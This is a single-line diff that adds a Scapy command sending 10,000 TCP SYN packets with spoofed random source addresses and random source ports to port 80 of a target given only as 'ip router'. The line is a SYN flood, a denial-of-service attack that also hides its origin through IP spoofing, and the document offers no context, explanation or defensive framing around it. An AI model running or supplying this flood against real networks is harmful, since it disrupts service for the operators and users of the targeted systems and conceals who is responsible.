@@ -1,0 +1,1 @@
+send(IP(dst='ip router', src=RandIP())/TCP(sport=RandShort(), dport=80, flags="S"), count=10000)
